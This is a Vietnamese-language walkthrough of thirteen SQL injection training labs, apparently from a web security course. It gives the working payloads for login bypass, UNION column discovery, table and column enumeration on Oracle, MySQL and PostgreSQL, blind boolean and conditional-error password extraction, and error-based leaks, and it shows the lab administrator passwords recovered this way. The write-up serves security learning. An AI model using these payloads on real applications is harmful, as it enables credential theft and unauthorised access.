## LAB 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

__Lỗ hổng SQL injection trong mệnh đề WHERE cho phép truy xuất dữ liệu ẩn__

![2025-11-05-17-09-37](../images/2025-11-05-17-09-37.png)
---
 
Truy vấn có dạng:

```sql
SELECT * FROM products WHERE category = 'gift` AND release=1;
```
 
---
![2025-11-05-17-27-59](../images/2025-11-05-17-27-59.png)
---
 
Truy cập vào request có tham số `category`, có tham số về thể loại\n
Truy vấn có dạng:
```sql
SELECT * FROM products WHERE category = 'input' AND release=1;
```
 
---
![2025-11-05-17-20-53](../images/2025-11-05-17-20-53.png)
---
 
--> Sửa tham số `category` thành: `gift' OR '1'='1-- -`

--> Truy vấn trở thành:
```sql
SELECT * FROM products WHERE category = 'gift' OR '1'='1-- -' AND release=1;
```

--> Phần của tham số `release` sẽ bị bỏ qua do dấu `-- -` (comment trong SQL)

--> Web sẽ trả về tất cả các sản phẩm, bao gồm cả những sản phẩm chưa được phát hành (release=0)

---
![2025-11-05-17-21-16](../images/2025-11-05-17-21-16.png)


## LAB 2: SQL injection vulnerability allowing login bypass

__Lỗ hổng SQL injection cho phép vượt qua xác thực đăng nhập__

![2025-11-05-20-40-07](../images/2025-11-05-20-40-07.png)
---
 
Lab yêu cầu khai thác lỗ hổng `SQL injection` trong biểu mẫu đăng nhập để đăng nhập thành công vào tài khoản `administrator`, qua đó vượt qua cơ chế xác thực của ứng dụng.
 
---
![2025-11-05-20-56-15](../images/2025-11-05-20-56-15.png)
![2025-11-05-20-56-41](../images/2025-11-05-20-56-41.png)
![2025-11-05-20-58-11](../images/2025-11-05-20-58-11.png)
![2025-11-05-20-59-14](../images/2025-11-05-20-59-14.png)

# LAB 3: SQL injection UNION attack, determining the number of columns returned by the query

__Tấn công SQL injection UNION, xác định số cột được truy vấn trả về__

![2025-11-05-21-18-03](../images/2025-11-05-21-18-03.png)
---
 
Lab hướng dẫn khai thác `SQL injection UNION attack` trên bộ lọc danh mục sản phẩm. Mục tiêu là xác định số lượng cột mà truy vấn gốc trả về, bằng cách thực hiện một truy vấn `UNION` bổ sung một hàng chứa các giá trị `NULL`. Khi biết chính xác số cột, có thể tận dụng kỹ thuật này cho các bước khai thác tiếp theo để trích dữ liệu từ bảng khác.
 
---
![2025-11-05-21-20-20](../images/2025-11-05-21-20-20.png)
---
 
Burp Repeater đang gửi lại yêu cầu gốc `GET /filter?category=Accessories`, giữ nguyên tham số danh mục để làm mốc so sánh trước khi thử payload.
 
---
![2025-11-05-21-27-16](../images/2025-11-05-21-27-16.png)
---
 
Chèn dấu ' vào cuối tham số `category`, phản hồi trả `500 Internal Server Error`, cho thấy truy vấn SQL phía máy chủ bị phá vỡ cú pháp.
 
---
![2025-11-05-21-28-15](../images/2025-11-05-21-28-15.png)
---
 
Payload `Accessories'--+` sử dụng comment để bỏ phần còn lại của truy vấn;\Ứng dụng phản hồi `200 OK`, xác nhận có thể đóng comment để ổn định truy vấn sau khi chèn
 
---
![2025-11-05-21-29-18](../images/2025-11-05-21-29-18.png)
---
 
Payload `Accessories'+ORDER+BY+3--+` vẫn trả trang bình thường\-->Chứng tỏ truy vấn gốc có tối thiểu 3 cột\Đây là bước đếm cột bằng `ORDER BY`
 
---
![2025-11-05-21-29-48](../images/2025-11-05-21-29-48.png)
---
 
Khi tăng lên `ORDER BY 4`, phản hồi lại lỗi nội bộ, nghĩa là truy vấn gốc chỉ có `3` cột và giá trị `4` làm vượt quá số cột hợp lệ.
 
---
![2025-11-05-21-32-01](../images/2025-11-05-21-32-01.png)
---
 
`Accessories'+UNION+SELECT+NULL,+NULL,+NULL-- -`\
Trả trang bình thường, xác nhận `UNION` với `3` cột `NULL` phù hợp với truy vấn gốc
 
---
![2025-11-05-21-32-18](../images/2025-11-05-21-32-18.png)
---
 
Trang kết quả hiển thị thông báo __“Congratulations, you solved the lab!”__ \
Xác nhận việc xác định số cột bằng kỹ thuật `UNION` đã hoàn thành.
 
---

## LAB 4: SQL injection UNION attack, finding a column containing text

__Tấn công SQL injection UNION, tìm cột chứa dữ liệu dạng văn bản__

![2025-11-05-21-47-07](../images/2025-11-05-21-47-07.png)
---
 
Màn hình lab nêu mục tiêu phải chèn giá trị ngẫu nhiên do bài cho vào kết quả truy vấn bằng `SQL injection UNION`\Nghĩa là cần tìm cột chấp nhận dữ liệu dạng chuỗi.
 
---
![2025-11-05-21-49-30](../images/2025-11-05-21-49-30.png)
---
 
Request gốc `GET /filter?category=Gifts` phản hồi `200 OK`\Xác nhận baseline hoạt động trước khi thử payload.
 
---
![2025-11-05-21-49-58](../images/2025-11-05-21-49-58.png)
---
 
Thêm dấu `'` vào tham số `(category=Gifts')` dẫn tới `500 Internal Server Error`\-->Chứng minh đầu vào chưa được escape và có thể `SQLi`
 
---
![2025-11-05-21-50-18](../images/2025-11-05-21-50-18.png)
---
 
`Payload Gifts'--` dùng comment để “vá” lại truy vấn\-->Phản hồi `200 OK`, chuẩn bị cho bước đếm cột.
 
---
![2025-11-05-21-52-02](../images/2025-11-05-21-52-02.png)
---
 
Dùng Intruder thử `ORDER BY $N` với `N` từ 1 tới 5\
 
---
![2025-11-05-21-51-28](../images/2025-11-05-21-51-28.png)
---
 
-->Kết quả: `ORDER BY 1..3` trả `200`, còn `ORDER BY 4 và 5` trả `500`\-->Suy ra truy vấn gốc có đúng `3`cột.
 
---
![2025-11-05-21-59-31](../images/2025-11-05-21-59-31.png)
---
 
 Thử cặp payload UNION SELECT với chuỗi bọc trong dấu `"` (ví dụ `"a", NULL, NULL`)
 
---
![2025-11-05-21-58-49](../images/2025-11-05-21-58-49.png)
---

Nhưng mọi request bị lỗi (status 0/không phản hồi), cho thấy DB không chấp nhận kiểu chuỗi với double quote.
 
---
![2025-11-05-22-00-49](../images/2025-11-05-22-00-49.png)
---
 
Chuyển sang dùng dấu `'` (ví dụ `'a', NULL, NULL`).
 
---
![2025-11-05-22-01-37](../images/2025-11-05-22-01-37.png)
---
 
Kết quả Intruder cho thấy chỉ payload `NULL, 'a', NULL` nhận `200`, nghĩa là cột thứ 2 hỗ trợ dữ liệu dạng văn bản
 
---
![2025-11-05-22-03-53](../images/2025-11-05-22-03-53.png)
---
 
Thay chuỗi thử nghiệm bằng giá trị ngẫu nhiên bài yêu cầu (ví dụ `oJq3rt`) trong payload `Gifts' UNION SELECT NULL, 'oJq3rt', NULL-- -`, và chuỗi này xuất hiện trong kết quả
 
---
![2025-11-05-22-04-09](../images/2025-11-05-22-04-09.png)
---

Trang thông báo __“Congratulations, you solved the lab!”__, hoàn tất mục tiêu đưa giá trị bài cho vào kết quả truy vấn.
 
---

## LAB 5: SQL injection UNION attack to retrieve data from other tables

__Tấn công SQL injection UNION để truy xuất dữ liệu từ các bảng khác__

![2025-11-06-20-31-06](../images/2025-11-06-20-31-06.png)
---
 
Lab giới thiệu mục tiêu:\
Dùng `SQL injection UNION` để đọc bảng `users` (`username`, `password`) rồi đăng nhập tài khoản `administrator`.
 
---
![2025-11-06-20-32-49](../images/2025-11-06-20-32-49.png)
---
 
Request gốc `GET /filter?category=Corporate+gifts` trả `200 OK`\
Làm đường baseline trước khi thử payload.
 
---
![2025-11-06-20-33-29](../images/2025-11-06-20-33-29.png)
---

Thêm dấu `'` vào tham số gây `500 Internal Server Error`, xác nhận điểm tiêm và lỗi cú pháp SQL.

---
![2025-11-06-20-33-54](../images/2025-11-06-20-33-54.png)
---

Payload `Corporate+gifts'-- -` dùng comment để khôi phục truy vấn, phản hồi `200`, sẵn sàng bước đếm cột

---
![2025-11-06-20-34-25](../images/2025-11-06-20-34-25.png)
---

Không dùng được `ORDER BY` 

---
![2025-11-06-20-37-58](../images/2025-11-06-20-37-58.png)
---
 
Thử UNION SELECT NULL thất bại (500), nhắc cần khớp đúng số cột
 
---
![2025-11-06-20-40-50](../images/2025-11-06-20-40-50.png)
---

Intruder chạy danh sách `NULL, NULL,NULL, NULL,NULL,NULL…`;\
Chỉ payload `NULL,NULL` trả `200`, khẳng định truy vấn gốc có 2 cột

---
![2025-11-06-20-44-08](../images/2025-11-06-20-44-08.png)
---
 
Dùng `UNION SELECT username, password FROM users--` hiển thị cặp tài khoản đầu tiên `wiener / jh7uflgimyxh4uts7jv9`, chứng tỏ có thể đọc bảng `users`
 
---
![2025-11-06-20-50-07](../images/2025-11-06-20-50-07.png)
Thêm điều kiện `WHERE username='administrator'` để lọc đúng tài khoản quản trị; phản hồi chứa `administrator / vo0asiqrq5762wjeeixq`
![2025-11-06-20-50-45](../images/2025-11-06-20-50-45.png)

---

Sau khi dùng thông tin trên để đăng nhập, trang “My Account” xác nhận đăng nhập thành công với username `administrator`, đồng thời lab được đánh dấu solved.

---
## LAB 6: SQL injection UNION attack, retrieving multiple values in a single column

__Tấn công SQL injection UNION, truy xuất nhiều giá trị trong một cột__

![2025-11-06-20-56-12](../images/2025-11-06-20-56-12.png)
---
 
Request gốc `GET /filter?category=Pets` trả `200 OK`, đặt baseline cho lab “retrieving multiple values in a single column”.
 
---
![2025-11-06-20-56-28](../images/2025-11-06-20-56-28.png)
---
 
Chỉ thêm dấu `'` khiến phản hồi `500`, xác nhận có lỗ hổng `SQLi`.
 
---
![2025-11-06-20-56-45](../images/2025-11-06-20-56-45.png)
---
 
Dùng payload `Pets'--` để comment phần còn lại của truy vấn và khôi phục phản hồi `200`
 
---
![2025-11-06-20-59-54](../images/2025-11-06-20-59-54.png)
---
 
Thử `UNION SELECT NULL--` gây lỗi `500`, cho thấy số cột không khớp và cần xác định chính xác.
 
---
![2025-11-06-21-00-41](../images/2025-11-06-21-00-41.png)
---

Intruder thử chuỗi `NULL, NULL,NULL, NULL,NULL,NULL…`; chỉ `NULL,NULL` trả `200`, chứng minh truy vấn gốc có `2` cột.

---
![2025-11-06-21-01-29](../images/2025-11-06-21-01-29.png)
---
 

 
---
![2025-11-06-21-01-47](../images/2025-11-06-21-01-47.png)

---

Test cột nào nhận chuỗi; payload `UNION SELECT 'a', NULL--` lỗi, trong khi `UNION SELECT NULL, 'a'--` trả `200`, nên cột thứ hai là kiểu chuỗi.

---
![2025-11-06-21-06-36](../images/2025-11-06-21-06-36.png)
---

Xây dựng payload `UNION SELECT NULL, username || '~~' || password FROM users WHERE username='administrator'--`. Phần `||` ghép username và password vào cùng cột, hiển thị `administrator~~xkzdcjb297erzm54`.
 
---
![2025-11-06-21-07-39](../images/2025-11-06-21-07-39.png)
---

Dùng thông tin vừa lấy để đăng nhập; trang “My Account” xác nhận tài khoản `administrator` và lab được đánh dấu solved.

---

## LAB 7: SQL injection attack, querying the database type and version on Oracle

__Tấn công SQL injection, truy vấn loại và phiên bản cơ sở dữ liệu trên Oracle__

![2025-11-06-21-20-55](../images/2025-11-06-21-20-55.png)

---
 
Lab yêu cầu dùng `SQL injection` trên `Oracle` để hiển thị chuỗi `version` của DB
 
---
![2025-11-06-21-23-42](../images/2025-11-06-21-23-42.png)

---
 
Request hợp lệ `category=Gifts` trả `200`, dùng làm baseline.
 
---
![2025-11-06-21-24-21](../images/2025-11-06-21-24-21.png)

---
 
Thêm dấu `'` → `500 Internal Server Error`, chứng tỏ có lỗ hổng `SQLi`.
 
---
![2025-11-06-21-24-44](../images/2025-11-06-21-24-44.png)

---

Comment payload `Gifts'--` khôi phục `200`, sẵn sàng thử `UNION`.

---
![2025-11-06-21-27-33](../images/2025-11-06-21-27-33.png)

---
 
`UNION SELECT NULL--` lỗi `500`; cần xác định số cột chính xác và cú pháp cho `Oracle`.
 
---
![2025-11-06-21-37-55](../images/2025-11-06-21-37-55.png)

---
 
Intruder với nhiều `NULL` vẫn `500`; chưa có payload nào thành công.
 
---
![2025-11-06-21-38-08](../images/2025-11-06-21-38-08.png)

---
 
Gợi ý của lab nhắc `Oracle` yêu cầu `SELECT ... FROM ...` (dùng bảng `dual`)
 
---
![2025-11-06-21-38-57](../images/2025-11-06-21-38-57.png)

---

Intruder mới với dạng `NULL, NULL FROM dual` cho thấy chỉ payload có 2 cột `NULL` trả `200`, xác nhận truy vấn gốc có 2 cột

---
![2025-11-06-21-44-19](../images/2025-11-06-21-44-19.png)

---
 
Thử `UNION SELECT 'a', NULL FROM dual--` trả `200`; tức cột đầu chấp nhận chuỗi, cột sau vẫn `NULL`.
 
---
![2025-11-06-21-50-31](../images/2025-11-06-21-50-31.png)

---

Payload `UNION SELECT (SELECT * FROM v$version), NULL FROM dual--` lỗi `500` vì subquery trả nhiều dòng/column

---
![2025-11-06-21-50-51](../images/2025-11-06-21-50-51.png)

---
 
Điều chỉnh thành `UNION SELECT (SELECT banner FROM v$version WHERE ROWNUM=1), NULL FROM dual--` để lấy dòng đầu tiên; trang hiển thị banner DB "Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production"
 
---
![2025-11-06-22-02-17](../images/2025-11-06-22-02-17.png)

---

Rút gọn payload cuối cùng `UNION select banner, NULL from v$version--`, vẫn trả `200`

---
![2025-11-06-22-03-10](../images/2025-11-06-22-03-10.png)

---
 
Giao diện người dùng hiển thị chuỗi phiên bản `Oracle` ngay trong danh sách sản phẩm, xác nhận khai thác thành công.
 
---
![2025-11-06-22-03-26](../images/2025-11-06-22-03-26.png)

---

Banner “Solved” xuất hiện, lab hoàn thành với payload `Tech gifts' UNION select banner, NULL from v$version--`

---

## LAB 8: SQL injection attack, querying the database type and version on MySQL and Microsoft

__Tấn công SQL injection, truy vấn loại và phiên bản cơ sở dữ liệu trên MySQL và Microsoft SQL Server__

![2025-11-07-14-34-45](../images/2025-11-07-14-34-45.png)
---
 
Lab mục tiêu: lợi dụng `SQLi` để hiển thị chuỗi phiên bản DB (`MySQL/MSSQL`).
 
---
![2025-11-07-14-36-49](../images/2025-11-07-14-36-49.png)
---
 
Request hợp lệ `category=Pets` trả `200 OK`, dùng làm baseline
 
---
![2025-11-07-14-37-10](../images/2025-11-07-14-37-10.png)
---
 
Thêm dấu `'` gây `500 Internal Server Error`, xác nhận `SQLi`.
 
---
![2025-11-07-14-37-39](../images/2025-11-07-14-37-39.png)
---
 
Payload `Pets'--` chữa lỗi và đưa phản hồi về `200`, cho phép thử `UNION`
 
---
![2025-11-07-14-38-46](../images/2025-11-07-14-38-46.png)

![2025-11-07-14-39-10](../images/2025-11-07-14-39-10.png)
---
 
Intruder chạy `UNION SELECT NULL...` xác định truy vấn gốc có `2` cột (chỉ `NULL, NULL` trả `200`)
 
---
![2025-11-07-14-39-45](../images/2025-11-07-14-39-45.png)
---
 
Payload `UNION SELECT 'a', NULL--` thành công, chứng minh cột `1` nhận chuỗi.
 
---
![2025-11-07-14-41-12](../images/2025-11-07-14-41-12.png)
---
 
Thay `'a'` bằng hàm DB `@@version` (`MySQL/MSSQL`) và để `NULL` ở cột thứ hai; phản hồi vẫn `200`
 
---
![2025-11-07-14-41-46](../images/2025-11-07-14-41-46.png)

 
Trên giao diện, chuỗi phiên bản `8.0.42-0ubuntu0.20.04.1` xuất hiện trong danh sách sản phẩm—mục tiêu lab đạt được.
 
---
![2025-11-07-14-41-59](../images/2025-11-07-14-41-59.png)
---
 
Banner `“Solved”` xác nhận lab hoàn thành với payload `Pets' UNION SELECT @@version, NULL--`.
 
---
## LAB 9: SQL injection attack, listing the database contents on non-Oracle databases

__Tấn công SQL injection, liệt kê nội dung cơ sở dữ liệu trên các DB không phải Oracle__

![2025-11-07-14-52-16](../images/2025-11-07-14-52-16.png)

---
 
Lab yêu cầu liệt kê bảng và cột để lấy thông tin đăng nhập rồi dùng để log in `administrator`.
 
---
![2025-11-07-14-53-13](../images/2025-11-07-14-53-13.png)

---
 
Request hợp lệ `category=Tech+gifts` trả `200`, tạo baseline.
 
---
![2025-11-07-14-53-31](../images/2025-11-07-14-53-31.png)

---

Thêm `'` vào tham số → `500 Internal Server Error`, chứng minh `SQLi`.

---
![2025-11-07-14-53-48](../images/2025-11-07-14-53-48.png)

---

Payload `Tech+gifts'--` bình thường lại truy vấn (`200`), sẵn sàng `UNION`

---
![2025-11-07-14-54-13](../images/2025-11-07-14-54-13.png)

---
 
`UNION SELECT NULL, NULL--` thành công → truy vấn gốc có `2` cột.
 
---
![2025-11-07-14-54-32](../images/2025-11-07-14-54-32.png)

---
 
Thay NULL đầu bằng `'A'` nhận chuỗi ở cột 1, cột 2 giữ `NULL`.
 
---
![2025-11-07-14-56-59](../images/2025-11-07-14-56-59.png)

---
 
Payload `UNION SELECT version(), NULL--` trả về banner `“PostgreSQL 12.22...”`, xác nhận DB là `Postgres`.
 
---

![2025-11-07-15-06-18](../images/2025-11-07-15-06-18.png)

---
 

 
---
![2025-11-07-15-06-46](../images/2025-11-07-15-06-46.png)
---
 
Dùng `UNION SELECT table_name, table_schema FROM information_schema.columns--` để lọc và phát hiện bảng người dùng `users_owmglg`.
 
---

![2025-11-07-15-12-09](../images/2025-11-07-15-12-09.png)
---
 
Tiếp tục truy vấn `information_schema.columns` để lấy tên cột, cho thấy có cột `username_vjwgvd` và `password_ftkuwy`
 
---
![2025-11-07-15-11-47](../images/2025-11-07-15-11-47.png)

![2025-11-07-15-12-36](../images/2025-11-07-15-12-36.png)
![2025-11-07-15-14-42](../images/2025-11-07-15-14-42.png)
---

Payload `UNION SELECT username_vjwgvd, password_ftkuwy FROM users_owmglg` trả về dữ liệu thực tế; trang render hiển thị từng cặp `username/password`.

---
![2025-11-07-15-15-16](../images/2025-11-07-15-15-16.png)
---
 
Kết quả bao gồm `administrator / 7dqmik6ldxdj88ers6e3`, dùng để đăng nhập.
 
---
![2025-11-07-15-15-54](../images/2025-11-07-15-15-54.png)
---
 
Sau khi đăng nhập, trang `“My Account”` xác nhận đang ở tài khoản `administrator` và lab được đánh dấu __solved__.
 
---

## LAB 10: SQL injection attack, listing the database contents on Oracle databases

__Tấn công SQL injection, liệt kê nội dung cơ sở dữ liệu trên các DB Oracle__

![2025-11-07-15-34-57](../images/2025-11-07-15-34-57.png)
---
 
Lab mô tả mục tiêu: thông qua `SQLi Oracle` tìm bảng chứa thông tin đăng nhập và `login` với `administrator`
 
---
![2025-11-07-15-34-37](../images/2025-11-07-15-34-37.png)
---
 
Request chuẩn `category=Gifts` phản hồi `500` vì chưa xử lý payload, chứng tỏ tham số nhạy cảm.
 
---
![2025-11-07-15-35-18](../images/2025-11-07-15-35-18.png)
---
 
Thêm `'--` để comment phần còn lại, trả `200` và ổn định truy vấn, sẵn sàng `UNION`.
 
---
![2025-11-07-15-43-08](../images/2025-11-07-15-43-08.png)
![2025-11-07-15-43-35](../images/2025-11-07-15-43-35.png)
---
 
Intruder thử `UNION SELECT $NULLS FROM dual--` và phát hiện chỉ khi có `2` giá trị `NULL` mới trả `200`, nên truy vấn gốc có `2` cột.
 
---
![2025-11-07-15-44-16](../images/2025-11-07-15-44-16.png)
---
 
Payload `UNION SELECT 'a', NULL FROM dual--` thành công, xác định cột 1 nhận chuỗi, cột 2 để rỗng.
 
---
![2025-11-07-15-57-52](../images/2025-11-07-15-57-52.png)

![2025-11-07-15-58-12](../images/2025-11-07-15-58-12.png)
---
 
Dùng `all_tables` để lấy danh sách bảng; phản hồi liệt kê tên bảng và tìm thấy bảng mục tiêu `USERS_SHRPGH`.
 
---
![2025-11-07-16-06-06](../images/2025-11-07-16-06-06.png)
![2025-11-07-16-06-41](../images/2025-11-07-16-06-41.png)
---
 
Query all_tab_columns với bảng vừa tìm, thu được cột `USERNAME_ELXDSO` và `PASSWORD_WRWDUL`.
 
---
![2025-11-07-16-09-26](../images/2025-11-07-16-09-26.png)
---
 
`UNION SELECT USERNAME_ELXDSO, PASSWORD_WRWDUL FROM USERS_SHRPGH--` trả về toàn bộ tài khoản; trang hiển thị cả `administrator`.
 
---
![2025-11-07-16-10-13](../images/2025-11-07-16-10-13.png)
---
 
Trích được cặp `administrator / wnb0hmqj5iaoh30y3yka`.
 
---
![2025-11-07-16-10-46](../images/2025-11-07-16-10-46.png)
---
 
Đăng nhập bằng thông tin trên, trang `“My Account”` hiển thị `username administrator` và lab được đánh dấu __solved__
 
---

## LAB 11: Blind SQL injection with conditional responses

__SQL injection mù với phản hồi có điều kiện__

![2025-11-07-16-22-19](../images/2025-11-07-16-22-19.png)
---
 
Lab mô tả lỗ hổng Blind SQLi; phải suy luận mật khẩu `administrator` qua cookie `TrackingId` dựa trên thông báo _“Welcome back!”_.
 
---
![2025-11-07-16-26-29](../images/2025-11-07-16-26-29.png)

![2025-11-07-16-26-47](../images/2025-11-07-16-26-47.png)
![2025-11-07-16-27-06](../images/2025-11-07-16-27-06.png)
---
 
Gửi request bình thường `category=Gifts` với cookie theo trình duyệt;
 
---
![2025-11-07-16-28-09](../images/2025-11-07-16-28-09.png)
---
 
Khi giữ `TrackingId` mặc định, trang hiển thị _“Welcome back!”_ → cookie hợp lệ đang truy xuất có dữ liệu.
 
---
![2025-11-07-16-28-27](../images/2025-11-07-16-28-27.png)
---
 
Thêm dấu `'` vào `TrackingId` làm mất thông báo, xác nhận điểm `SQLi`.
 
---
![2025-11-07-16-28-46](../images/2025-11-07-16-28-46.png)
---
 
Dùng payload `TrackingId=...'+--` để đóng chuỗi và comment phần còn lại; _“Welcome back!”_ xuất hiện lại → đã kiểm soát cú pháp truy vấn dựa trên cookie.
 
---
![2025-11-07-16-31-45](../images/2025-11-07-16-31-45.png)
---
 
Intruder với payload `UNION SELECT NULL` vẫn giữ _Welcome=1_, nên truy vấn gốc trả 1 cột; khi thêm điều kiện sai, _Welcome=0_, dùng để phân biệt `true/false`.
 
---
![2025-11-07-16-32-50](../images/2025-11-07-16-32-50.png)
---
 
Payload `TrackingId=...'+UNION SELECT version()--` --> Lab dùng `PostgreSQL`
 
---
![2025-11-07-16-49-10](../images/2025-11-07-16-49-10.png)
![2025-11-07-16-49-33](../images/2025-11-07-16-49-33.png)
---
 
Intruder `' AND LENGTH((SELECT password FROM users WHERE username='administrator'))=n` để tìm độ dài; _Welcome=1_ khi `n=20` nên mật khẩu dài `20` ký tự.
 
---
![2025-11-07-16-58-35](../images/2025-11-07-16-58-35.png)
---
 
Tiếp tục brute force từng ký tự với `SUBSTRING(..., pos, 1)='x'`; bảng đỏ thể hiện các request trả _Welcome=1_ tương ứng ký tự đúng.
 
---
![2025-11-07-17-00-34](../images/2025-11-07-17-00-34.png)
---
 
Sau khi dựng đủ chuỗi và đăng nhập, trang __“My Account”__ xác nhận username `administrator`, lab đã __solved__.
 
---

## LAB 12: Blind SQL injection with conditional errors

__SQL injection mù với lỗi có điều kiện__

![2025-11-07-17-16-09](../images/2025-11-07-17-16-09.png)
---
 
Lab yêu cầu lợi dụng Blind `SQLi` dựa trên lỗi (_conditional errors_) để tìm mật khẩu `administrator`.
 
---
![2025-11-07-17-15-54](../images/2025-11-07-17-15-54.png)
---
 
Request dùng `'` với cookie `TrackingId` ban đầu gây lỗi `500` khi truy vấn hỏng, xác nhận cookie được đưa vào `SQL`.
 
---
![2025-11-07-17-16-36](../images/2025-11-07-17-16-36.png)
---
 
Thêm payload `'--` vào `TrackingId` để đóng chuỗi và comment phần còn lại; phản hồi chuyển sang `200 OK`, chứng tỏ đã kiểm soát truy vấn.
 
---
![2025-11-07-17-17-17](../images/2025-11-07-17-17-17.png)
---
 
Thử `UNION SELECT NULL FROM dual` qua `TrackingId`, phản hồi vẫn `200`, đảm bảo có thể chèn câu lệnh.
 
---
![2025-11-07-21-30-59](../images/2025-11-07-21-30-59.png)
![2025-11-07-21-31-18](../images/2025-11-07-21-31-18.png)
---
 
Sử dụng _Intruder_ với payload `' AND (SELECT CASE WHEN ... THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)`; nếu điều kiện đúng, câu `TO_CHAR(1/0)` tạo lỗi `500`. Chạy _brute force_ độ dài `password` và thấy `payload =20` gây lỗi → mật khẩu dài `20` ký tự.
 
---
![2025-11-07-21-35-42](../images/2025-11-07-21-35-42.png)

![2025-11-07-21-35-52](../images/2025-11-07-21-35-52.png)
---
 
Sử dụng tấn công `cluster bomb` để _brute force_ từng ký tự bằng `SUBSTR(password, pos, 1)` kết hợp `CASE WHEN ... THEN TO_CHAR(1/0)`, quan sát các request lỗi (màu cyan) để xác định chữ cái đúng.
 
---
![2025-11-07-21-41-33](../images/2025-11-07-21-41-33.png)
---
 
Sau khi thu được toàn bộ mật khẩu và đăng nhập, trang _“My Account”_ xác nhận username `administrator`, lab `solved`.
 
---

## LAB 13: Visible error-based SQL injection

__SQL injection dựa trên lỗi hiển thị__

![2025-11-07-22-02-42](../images/2025-11-07-22-02-42.png)
---
 
Lab __“Visible error-based SQL injection”__ – mục tiêu là khai thác cookie `TrackingId` để rò rỉ mật khẩu `administrator`.
 
---
![2025-11-07-22-06-29](../images/2025-11-07-22-06-29.png)
---
 
Khi thêm `'` vào `TrackingId`, ứng dụng trả lỗi __“Unterminated string literal… Expected char”__, chứng tỏ cookie được đưa thẳng vào câu SQL và lỗi hiển thị rõ nội dung truy vấn.
 
---
![2025-11-07-22-07-07](../images/2025-11-07-22-07-07.png)
---
 
`TrackingId=...'--` đóng chuỗi và comment phần còn lại; phản hồi trở về `200 OK`, cho phép thử tiếp.
 
---
![2025-11-07-22-30-02](../images/2025-11-07-22-30-02.png)
---
 
Thử `' AND CAST((SELECT 1) AS int)` khiến máy chủ báo lỗi __“argument of AND must be type boolean”__ → xác nhận ta có thể chèn mệnh đề `AND`, nhưng phải trả về _boolean_. Đây là dấu hiệu để dùng __CAST/TYPE__ nhằm tạo lỗi có điều kiện.
 
---
![2025-11-07-22-30-20](../images/2025-11-07-22-30-20.png)

![2025-11-07-22-31-01](../images/2025-11-07-22-31-01.png)
---
 
Đổi sang `' AND 1=CAST((SELECT 'test') AS int)` làm ứng dụng báo lỗi _“invalid input syntax for type integer: 'test'”_. Ta lợi dụng thông báo này để rò rỉ dữ liệu; mọi thứ được chèn vào `SELECT '...` sẽ lộ trong thông báo lỗi
 
---
![2025-11-07-22-33-37](../images/2025-11-07-22-33-37.png)
---
 
Thử `CAST((SELECT password FROM users LIMIT 1) AS int)`, nhưng gặp lỗi _“Unterminated string literal”_ do độ dài câu truy vấn bị giới hạn 
 
---
![2025-11-07-22-34-43](../images/2025-11-07-22-34-43.png)
---
 
Để vượt giới hạn, xóa giá trị `TrackingId` ban đầu (đặt rỗng) rồi chèn payload ngắn hơn: `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`. Lỗi hiển thị chính xác chuỗi mật khẩu trong thông báo __“invalid input syntax for type integer: 'z75anh0ybng4v5woecq1'”__.
 
---
![2025-11-07-22-35-22](../images/2025-11-07-22-35-22.png)
---
 
Dùng mật khẩu thu được để đăng nhập, trang __“My Account”__ xác nhận username `administrator`, lab hoàn thành.
 
---